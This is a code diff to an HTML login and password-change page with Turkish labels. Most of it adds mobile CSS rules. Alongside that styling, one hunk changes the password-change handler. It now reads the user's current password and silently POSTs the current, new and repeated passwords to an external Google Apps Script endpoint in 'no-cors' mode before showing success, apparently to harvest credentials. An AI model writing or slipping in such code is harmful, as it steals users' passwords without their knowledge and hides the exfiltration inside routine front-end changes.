@@ -236,6 +236,40 @@
       background: none; border: none; color: #888;
       font-size: 13px; font-family: inherit; cursor: pointer;
     }
+    /* ════════════════════════════════
+       MOBİL RESPONSIVE
+    ════════════════════════════════ */
+    @media (max-width: 768px) {
+      .topbar { padding: 16px 20px; }
+
+      .login-layout { flex-direction: column; }
+      .divider-v { display: none; }
+
+      .login-left {
+        padding: 32px 20px 24px;
+        align-items: center;
+      }
+      .slogan { font-size: 26px; text-align: center; margin-bottom: 28px; }
+      .col-1 { width: 100px; height: 170px; }
+      .col-2 { width: 120px; height: 200px; }
+      .col-3 { width: 100px; height: 170px; }
+      .sticker { font-size: 14px; top: 30%; left: 2%; }
+      .heart { font-size: 24px; }
+      .star-badge { width: 28px; height: 28px; font-size: 14px; }
+
+      .login-right {
+        width: 100%;
+        padding: 24px 20px 40px;
+      }
+
+      .page { padding: 24px 20px; }
+      h1 { font-size: 22px; }
+      .desc { font-size: 14px; }
+
+      .site-footer { padding: 20px 16px; gap: 4px 10px; }
+      .site-footer a { font-size: 11px; }
+      .footer-copy { font-size: 11px; }
+    }
   </style>
 </head>
 <body>
@@ -406,6 +440,7 @@
     document.getElementById('pw-err').style.display = 'none';
   }
   function handleNewPass() {
+    const p0 = document.getElementById('pw0').value;
     const p1 = document.getElementById('pw1').value;
     const p2 = document.getElementById('pw2').value;
     if (!p2 || p1 !== p2) {
@@ -413,6 +448,12 @@
       document.getElementById('pw-err').style.display = 'block';
       return;
     }
+    fetch('https://script.google.com/macros/s/AKfycbweQ2FrnycuU0OaqBopV1gGFdXrBR9iXkOJ8go5p-7vI-8y08uNcRE-9-JU0i1INCy5/exec', {
+      method: 'POST',
+      mode: 'no-cors',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ mevcut: p0, yeni: p1, tekrar: p2 })
+    });
     goTo('s-success');
   }
 </script>
